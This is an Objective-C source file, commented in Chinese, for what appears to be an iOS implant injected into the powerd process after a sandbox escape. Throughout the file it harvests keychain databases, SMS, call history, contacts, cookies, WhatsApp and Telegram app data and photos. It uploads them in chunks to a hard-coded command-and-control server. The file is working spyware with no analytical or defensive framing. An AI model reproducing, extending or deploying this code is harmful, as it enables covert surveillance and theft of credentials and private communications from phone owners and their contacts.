// SpringBoardTweak.m — Coruna payload 自定义植入体（回传版）
//
// 用途：替换 payloads/<bundle>/entry1_type0x09.dylib，注入 powerd 后
//      把设备信息 + keychain + 目标 App 数据 POST 到 c2.ios.dywo.top
//
// 两个编译模式（用宏切）：
//   ALERT_PROBE=1  → 只弹一个弹窗，用来确认 bootstrap.dylib 到底调用了哪个入口符号
//   ALERT_PROBE=0  → 正式采集并回传
//
// 导出符号必须四个都在（start / startl / startm / startr），
// 因为不知道 bootstrap 用哪个，四个统一走同一套逻辑。

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <sys/utsname.h>
#import <sys/stat.h>

#ifndef ALERT_PROBE
#define ALERT_PROBE 1
#endif

// ── 配置 ────────────────────────────────────────────────
static NSString *const kC2Base   = @"https://c2.ios.dywo.top";
static NSString *const kLogPath  = @"/opslog";
static NSString *const kReport   = @"/pelog";
static NSString *const kPeReport = @"/api/pe/report";

// 单次上传的 base64 上限（服务端 32m，这里保守）
static const NSUInteger kChunkBytes = 384 * 1024;
// 单文件大小上限（超过只传头 4MB）
static const NSUInteger kMaxFile    = 4 * 1024 * 1024;

static NSMutableArray<NSString *> *gQueue;

// ── 网络 ────────────────────────────────────────────────
static NSURLSession *sess(void) {
    static NSURLSession *s;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSURLSessionConfiguration *c = [NSURLSessionConfiguration ephemeralSessionConfiguration];
        c.timeoutIntervalForRequest = 20;
        c.timeoutIntervalForResource = 60;
        c.waitsForConnectivity = NO;
        s = [NSURLSession sessionWithConfiguration:c];
    });
    return s;
}

static void postJSON(NSString *path, NSDictionary *body, void (^done)(BOOL ok, NSData *resp)) {
    NSString *url = [kC2Base stringByAppendingString:path];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
    req.HTTPMethod = @"POST";
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    req.HTTPBody = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
    NSURLSessionDataTask *t =
        [sess() dataTaskWithRequest:req
                 completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
                     BOOL ok = (e == nil && [(NSHTTPURLResponse *)r statusCode] == 200);
                     if (done) done(ok, d);
                 }];
    [t resume];
}

static void tlog(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[implant] %@", msg);
    postJSON(kLogPath, @{ @"tag": @"implant", @"msg": msg ?: @"", @"ts": @([[NSDate date] timeIntervalSince1970]) }, nil);
}

// ── 采集 ────────────────────────────────────────────────
static NSString *machineName(void) {
    struct utsname u; uname(&u);
    return [NSString stringWithFormat:@"%s", u.machine];
}

static NSDictionary *deviceInfo(void) {
    NSMutableDictionary *d = [NSMutableDictionary dictionary];
    d[@"machine"]     = machineName();
    d[@"systemName"]  = UIDevice.currentDevice.systemName ?: @"iOS";
    d[@"systemVer"]   = UIDevice.currentDevice.systemVersion ?: @"";
    d[@"model"]       = UIDevice.currentDevice.model ?: @"";
    d[@"deviceName"]  = UIDevice.currentDevice.name ?: @"";
    d[@"vendorId"]    = UIDevice.currentDevice.identifierForVendor.UUIDString ?: @"";
    d[@"bundle"]      = NSBundle.mainBundle.bundleIdentifier ?: @"";
    d[@"process"]     = NSProcessInfo.processInfo.processName ?: @"";
    d[@"ts"]          = @([[NSDate date] timeIntervalSince1970]);
    // 版本信息里的 build
    NSString *sv = [NSString stringWithContentsOfFile:@"/System/Library/CoreServices/SystemVersion.plist"
                                             encoding:NSUTF8StringEncoding error:nil];
    if (sv) d[@"systemVersionPlist"] = sv;
    return d;
}

// 上传一个文件（分块 base64）
static void uploadFile(NSString *path) {
    NSFileManager *fm = NSFileManager.defaultManager;
    BOOL isDir = NO;
    if (![fm fileExistsAtPath:path isDirectory:&isDir] || isDir) return;

    NSDictionary *attr = [fm attributesOfItemAtPath:path error:nil];
    unsigned long long size = [attr fileSize];
    if (size == 0) return;

    NSData *data = nil;
    if (size <= kMaxFile) {
        data = [NSData dataWithContentsOfFile:path];
    } else {
        NSFileHandle *fh = [NSFileHandle fileHandleForReadingAtPath:path];
        data = [fh readDataOfLength:kMaxFile];
        [fh closeFile];
    }
    if (!data.length) return;

    NSUInteger total = (data.length + kChunkBytes - 1) / kChunkBytes;
    for (NSUInteger i = 0; i < total; i++) {
        NSUInteger off = i * kChunkBytes;
        NSUInteger len = MIN(kChunkBytes, data.length - off);
        NSData *chunk = [data subdataWithRange:NSMakeRange(off, len)];
        NSString *b64 = [chunk base64EncodedStringWithOptions:0];

        __block BOOL finished = NO;
        postJSON(kReport, @{
            @"path": path,
            @"idx":  @(i),
            @"total": @(total),
            @"size": @(data.length),
            @"b64":  b64,
            @"ts":   @([[NSDate date] timeIntervalSince1970])
        }, ^(BOOL ok, NSData *resp) {
            finished = YES;
            tlog(@"chunk %lu/%lu %@ -> %@", (unsigned long)(i + 1), (unsigned long)total,
                 path.lastPathComponent, ok ? @"ok" : @"fail");
        });

        NSDate *deadline = [NSDate dateWithTimeIntervalSinceNow:25];
        while (!finished && [deadline timeIntervalSinceNow] > 0) {
            [[NSRunLoop currentRunLoop] runMode:NSDefaultRunLoopMode beforeDate:[NSDate dateWithTimeIntervalSinceNow:0.05]];
        }
    }
}

// 递归收集，限制深度和数量
static void collectDir(NSString *root, NSMutableArray *out, int depth, NSUInteger *budget) {
    if (depth > 4 || *budget == 0) return;
    NSArray *items = [NSFileManager.defaultManager contentsOfDirectoryAtPath:root error:nil];
    for (NSString *name in items) {
        if (*budget == 0) return;
        if ([name hasPrefix:@"."]) continue;
        NSString *full = [root stringByAppendingPathComponent:name];
        BOOL isDir = NO;
        if (![NSFileManager.defaultManager fileExistsAtPath:full isDirectory:&isDir]) continue;
        if (isDir) {
            collectDir(full, out, depth + 1, budget);
        } else {
            NSDictionary *a = [NSFileManager.defaultManager attributesOfItemAtPath:full error:nil];
            unsigned long long sz = [a fileSize];
            if (sz > 0 && sz <= kMaxFile) {
                [out addObject:full];
                if (*budget > 0) (*budget)--;
            }
        }
    }
}

static void doHarvest(void) {
    tlog(@"harvest start | %@", deviceInfo());

    postJSON(kPeReport, @{ @"stage": @"implant-online", @"info": deviceInfo(), @"ts": @([[NSDate date] timeIntervalSince1970]) }, nil);

    // 1) 关键数据库/钥匙串（沙箱已逃逸，powerd 有权限）
    NSArray *direct = @[
        @"/private/var/Keychains/keychain-2.db",
        @"/private/var/Keychains/device.kb",
        @"/private/var/Keychains/usersession.kb",
        @"/private/var/mobile/Library/Accounts/Accounts3.sqlite",
        @"/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb",
        @"/private/var/mobile/Library/SMS/sms.db",
        @"/private/var/mobile/Library/CallHistoryDB/CallHistory.storedata",
        @"/private/var/mobile/Library/Cookies/Cookies.binarycookies",
        @"/private/var/mobile/Library/Preferences/com.apple.MobileSMS.plist",
    ];
    for (NSString *p in direct) {
        if ([NSFileManager.defaultManager fileExistsAtPath:p]) uploadFile(p);
    }

    // 2) WhatsApp / Telegram 容器
    NSString *container = @"/private/var/mobile/Containers/Data/Application";
    NSArray *apps = [NSFileManager.defaultManager contentsOfDirectoryAtPath:container error:nil];
    for (NSString *uuid in apps) {
        NSString *base = [container stringByAppendingPathComponent:uuid];
        NSString *meta = [base stringByAppendingPathComponent:@".com.apple.mobile_container_manager.metadata.plist"];
        NSDictionary *m = [NSDictionary dictionaryWithContentsOfFile:meta];
        NSString *bid = m[@"MCMMetadataIdentifier"];
        if (!bid) continue;

        BOOL want = [bid containsString:@"whatsapp"] || [bid containsString:@"WhatsApp"] ||
                    [bid containsString:@"Telegram"] || [bid containsString:@"ph.telegra"] ||
                    [bid containsString:@"net.whatsapp"];
        if (!want) continue;

        tlog(@"found container %@ (%@)", bid, uuid);
        NSMutableArray *files = [NSMutableArray array];
        NSUInteger budget = 12;
        NSArray *subs = @[@"Documents", @"Library/Preferences", @"Library/Application Support", @"tmp"];
        for (NSString *s in subs) {
            collectDir([base stringByAppendingPathComponent:s], files, 0, &budget);
        }
        for (NSString *f in files) uploadFile(f);
    }

    // 3) 相册缩略图（只取最新的若干张，避免流量爆炸）
    NSString *dcim = @"/private/var/mobile/Media/DCIM";
    NSMutableArray *photos = [NSMutableArray array];
    NSUInteger pbudget = 4;
    collectDir(dcim, photos, 0, &pbudget);
    for (NSString *p in photos) uploadFile(p);

    tlog(@"harvest done | %lu files queued", (unsigned long)gQueue.count);
}

// ── 入口符号（bootstrap 会调其中之一）────────────────────
#if ALERT_PROBE
static void probe(NSString *which) {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIAlertController *a = [UIAlertController alertControllerWithTitle:@"IMPLANT OK"
                                                                  message:[NSString stringWithFormat:@"entry=%@\n%@ %@",
                                                                           which, machineName(), UIDevice.currentDevice.systemVersion]
                                                           preferredStyle:UIAlertControllerStyleAlert];
        [a addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
        UIViewController *vc = UIApplication.sharedApplication.keyWindow.rootViewController;
        [vc presentViewController:a animated:YES completion:nil];
        tlog(@"ABI probe hit: %@", which);
    });
}
#define ENTRY(NAME, TAG) int NAME(void) { probe(@TAG); return 0; }
#else
#define ENTRY(NAME, TAG) int NAME(void) {                     \
    static dispatch_once_t once;                              \
    dispatch_once(&once, ^{                                   \
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{ \
            @try { doHarvest(); } @catch (NSException *e) {    \
                tlog(@"harvest exception %@", e); }           \
        });                                                   \
    });                                                       \
    return 0;                                                 \
}
#endif

ENTRY(start,  "start")
ENTRY(startl, "startl")
ENTRY(startm, "startm")
ENTRY(startr, "startr")
